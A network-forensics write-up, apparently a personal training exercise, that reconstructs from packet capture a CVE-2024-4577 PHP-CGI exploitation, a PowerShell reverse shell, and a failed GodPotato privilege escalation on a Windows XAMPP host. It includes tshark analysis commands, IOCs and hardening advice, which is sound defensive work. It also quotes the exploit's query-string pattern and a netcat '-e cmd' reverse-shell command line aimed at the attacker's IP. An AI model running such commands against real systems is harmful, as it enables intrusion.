# 🕵️ Ghost Shell: Dissecting a Hand-Crafted PowerShell C2 Over Raw PCAP

**A network forensics case study — from an unauthenticated RCE on a Windows/XAMPP server to a failed SYSTEM privilege escalation, reconstructed frame-by-frame in Wireshark.**

![Category](https://img.shields.io/badge/Category-DFIR%20%2F%20Network%20Forensics-blue)
![Tool](https://img.shields.io/badge/Tool-Wireshark%20%2F%20tshark-1679A7)
![CVE](https://img.shields.io/badge/CVE-2024--4577-red)
![Status](https://img.shields.io/badge/Status-Completed-success)

> 📁 Evidence: single ~100 MB PCAP (`NetworkTraffic.pcap`), no logs, no memory image, no disk — just packets. The entire attack (from first exploit request to a failed privesc callback) was reconstructed purely from network traffic.

---

## 📌 Executive Summary

On **22 Jan 2025**, a Windows host (`192.168.170.130`, hostname `DESKTOP-HTVPLB2`) running a XAMPP web stack was exploited by an attacker at `192.168.170.128` using **CVE-2024-4577** — the PHP-CGI "Best-Fit" argument injection RCE. The attacker used the initial foothold to run reconnaissance commands, pivoted to a fully interactive, hand-crafted PowerShell reverse shell (no Metasploit/Cobalt Strike — built by hand, socket by socket), staged offensive tooling disguised under decoy filenames, and attempted a **GodPotato**-based SYSTEM privilege escalation. The escalation obtained a valid `NT AUTHORITY\SYSTEM` impersonation token but **failed at the final process-creation step**, leaving the attacker with only user-level (`cristo`) access.

| | |
|---|---|
| **Attacker** | `192.168.170.128` |
| **Victim** | `192.168.170.130` (`DESKTOP-HTVPLB2`) |
| **Compromised account** | `desktop-htvplb2\cristo` |
| **Initial access** | CVE-2024-4577 (PHP-CGI argument injection) |
| **C2 channel** | Hand-crafted PowerShell TCP reverse shell, port **4545** |
| **Privilege escalation** | GodPotato (renamed `TimeProvider.exe`), callback port **5555** |
| **Outcome** | ❌ Privilege escalation **failed** (`Win32Error: 2` — file not found on process creation) |

---

## 🧭 Attack Timeline

All times are relative to the start of the capture (`t+`).

| t+ (sec) | Frame(s) | Event |
|---|---|---|
| 96.5s | 11542 | First exploit POST hits `/?%ADd+allow_url_include...` (CVE-2024-4577), `whoami` |
| 96–178s | 11569–11920 | Recon: `whoami /priv`, `whoami /all`, `pwd`, `dir` |
| 179.1s | 12135 | Exploit payload spawns a PowerShell TCP reverse shell to `192.168.170.128:4545` |
| 180.4s | 12141 | Reverse shell handshake completes — interactive shell established |
| 294.0s | 24207 | `Invoke-WebRequest`/`wget` pulls `nc64.exe` from attacker's temp HTTP server (`:9696`), saved as `time.exe` |
| 346.3–347.1s | 60524–60934 | DNS + TLS to `github.com` / `objects.githubusercontent.com` — GodPotato release downloaded, saved as `TimeProvider.exe` |
| 384.9s | 81999 | 1st GodPotato execution attempt (`TimeProvider.exe -cmd "time.exe 192.168.170.128 5555 -e cmd"`) |
| 386.5s | 82886 | GodPotato obtains `NT AUTHORITY\SYSTEM` token, then **fails to spawn the process** (`Win32Error: 2`) |
| 430.2s | 107379 | 2nd GodPotato attempt — identical result, still fails |

---

## 🔬 Investigation Methodology

The whole case was solved with three Wireshark/tshark techniques, in this order. All commands below are `tshark` equivalents of the exact filters used in the Wireshark GUI, so you can run this analysis headless or reproduce it interactively.

### 1. Find the exploitation point — filter on POST requests
```bash
tshark -r NetworkTraffic.pcap -Y "http.request.method==POST" \
  -T fields -e frame.number -e ip.src -e ip.dst -e http.request.uri -e http.user_agent
```
GUI equivalent: `http.request.method == "POST"`

This immediately surfaces the CVE-2024-4577 fingerprint — a soft-hyphen (`%AD`) encoded `-d allow_url_include=1 -d auto_prepend_file=php://input` query string, sent repeatedly from `curl/8.11.1`.

### 2. Read the injected PHP payload of each request
```bash
tshark -r NetworkTraffic.pcap -Y "frame.number==<N>" -T fields -e http.file_data \
  | python3 -c "import sys;print(bytes.fromhex(sys.stdin.read().strip()).decode())"
```
This decodes each `<?php system('...'); ?>` payload straight from the raw hex, showing the attacker's command history in order — `whoami` → `whoami /priv` → `whoami /all` → `pwd` → `dir` → the PowerShell reverse shell one-liner.

### 3. Reconstruct the interactive shell — Follow TCP Stream
```bash
# Identify the stream on the reverse shell port
tshark -r NetworkTraffic.pcap -Y "tcp.port==4545" -T fields -e tcp.stream

# Dump the full bidirectional conversation as ASCII
tshark -r NetworkTraffic.pcap -q -z follow,tcp,ascii,<stream_id> > shell_session.txt
```
GUI equivalent: right-click any packet on port 4545 → **Follow → TCP Stream**.

This single stream contains the *entire* post-exploitation session — every command the attacker typed and every response — because the reverse shell has no encryption and no framing beyond `PS ` prompts.

### 4. Pull out identity, downloads, and privilege escalation evidence
```bash
grep -n -iE "whoami|GodPotato|iwr|wget|TimeProvider|Cannot create process" shell_session.txt
```
This is what surfaces the hostname/user, the tool downloads, the renamed binaries, and — critically — the GodPotato failure message that proves the attack didn't succeed.

### 5. Confirm (or rule out) the privesc callback
```bash
tshark -r NetworkTraffic.pcap -Y "tcp.port==5555" \
  -T fields -e frame.number -e ip.src -e ip.dst -e tcp.flags.str -e frame.time_relative
```
No new SYN/ACK handshake appears on port 5555 after either `TimeProvider.exe` execution — corroborating the `Win32Error: 2` message and confirming the escalation never produced a working shell.

> 💡 **CyberChef tip:** if a sample uses `powershell -enc <base64>` instead of a plaintext payload (this one didn't), paste the Base64 blob into CyberChef's "From Base64 → Decode text (UTF-16LE)" recipe to recover the script.

---

## 🧩 Findings — Question by Question

| # | Question | Answer |
|---|---|---|
| 1 | CVE exploited | **CVE-2024-4577** — PHP-CGI "Best-Fit" argument injection (Windows/XAMPP), CVSS 9.8 |
| 2 | Attacker's tool | **curl/8.11.1** (seen in every `User-Agent` header) |
| 3 | Attacker → Victim | **192.168.170.128 → 192.168.170.130** |
| 4 | First recon command | `whoami` |
| 5 | Reverse shell callback port | **TCP/4545** |
| 6 | Hostname\User | **DESKTOP-HTVPLB2\cristo** |
| 7 | Tool downloaded for a stable shell | **Netcat (`nc64.exe`)** → renamed to **`time.exe`** |
| 8 | Privilege escalation tool | **GodPotato** ([BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato), `GodPotato-NET4.exe`) → renamed to **`TimeProvider.exe`** |
| 9 | Privesc callback port | **TCP/5555** |
| 10 | Did privesc succeed? | **No.** GodPotato's own output shows it successfully abused `SeImpersonatePrivilege` via a DCOM/RPCSS trigger and obtained an `NT AUTHORITY\SYSTEM` token (`Find System Token : True`), but the final step — spawning `time.exe` as SYSTEM to call back on port 5555 — failed with `Cannot create process Win32Error:2` (`ERROR_FILE_NOT_FOUND`). A `whoami` run immediately afterward still returned `desktop-htvplb2\cristo`, and no handshake was ever observed on port 5555, confirming the attacker never escalated beyond the initial low-privileged user. |

---

## 🗺️ MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 | CVE-2024-4577 POST requests |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | Reverse shell one-liner |
| Execution | Command and Scripting Interpreter: Unix Shell / CGI | T1059 | `system()` PHP calls |
| Persistence/C2 | Application Layer Protocol / Non-Standard Port | T1571 | Raw TCP socket on port 4545 |
| Discovery | System Owner/User Discovery | T1033 | `whoami`, `whoami /priv`, `whoami /all` |
| Discovery | File and Directory Discovery | T1083 | `dir`, `pwd` |
| Command & Control | Ingress Tool Transfer | T1105 | `nc64.exe` and `GodPotato-NET4.exe` downloads |
| Defense Evasion | Masquerading: Match Legitimate Name or Location | T1036.005 | `nc64.exe → time.exe`, `GodPotato-NET4.exe → TimeProvider.exe` |
| Privilege Escalation | Exploitation for Privilege Escalation (Potato-family/DCOM abuse) | T1068 | GodPotato / `SeImpersonatePrivilege` abuse |

---

## 🧾 Indicators of Compromise (IOCs)

| Type | Value |
|---|---|
| Attacker IP | `192.168.170.128` |
| Victim IP / hostname | `192.168.170.130` / `DESKTOP-HTVPLB2` |
| Exploit User-Agent | `curl/8.11.1` |
| C2 port | `TCP/4545` |
| Privesc callback port | `TCP/5555` |
| Attacker staging HTTP server | `192.168.170.128:9696` |
| Dropped files | `time.exe` (Netcat), `TimeProvider.exe` (GodPotato) |
| Compromised account | `desktop-htvplb2\cristo` |

---

## 🛡️ Detection & Hardening Recommendations

- **Patch PHP** to ≥ 8.1.29 / 8.2.20 / 8.3.8, or disable CGI mode entirely on Windows PHP/XAMPP deployments.
- Alert on URLs containing a **soft-hyphen character (`%AD`)** combined with `allow_url_include` or `auto_prepend_file` — a near-unique IOC for CVE-2024-4577.
- Flag **outbound PowerShell processes opening raw `System.Net.Sockets.TCPClient` connections** to non-standard ports — a strong indicator of a hand-rolled reverse shell with no EDR-visible C2 framework.
- Alert on processes named after legitimate system components (`TimeProvider.exe`, `time.exe`) that are **not signed by Microsoft** and were **recently written to `C:\Windows\Temp`**.
- Monitor for **anomalous RPCSS/DCOM activation combined with named pipe creation** (`\pipe\epmapper`) from non-service processes — the core mechanic behind every "Potato" privilege-escalation variant.
- Restrict `SeImpersonatePrivilege` to only the accounts/services that genuinely require it.

---

## 🧠 Skills Demonstrated

- Recognizing an unauthenticated RCE exploitation chain from raw HTTP traffic
- Reconstructing an interactive attacker session with Wireshark's Follow TCP Stream
- Identifying Ingress Tool Transfer and Masquerading (MITRE T1105 / T1036.005) from network artifacts alone
- Evaluating a Windows privilege-escalation ("Potato" family) attempt and correctly judging **success vs. failure** from tool output rather than assuming the worst case
- Mapping a full attack chain to MITRE ATT&CK and producing actionable detection guidance

---

## 🧰 Tools Used

`Wireshark` / `tshark` · `CyberChef` (Base64/PowerShell decoding) · `VirusTotal` (hash/tool verification) · `MITRE ATT&CK Navigator`

---

*Personal DFIR training exercise, network-forensics track. Analysis and write-up by **Hafidh Bakari Juma** — cybersecurity & software engineering student (42 Luxembourg / DLH Cybersecurity Academy, SOC Analyst & Pentesting track).*
[GitHub](https://github.com/hafidhbakarjuma) · [hafidhbakar504@gmail.com](mailto:hafidhbakar504@gmail.com)
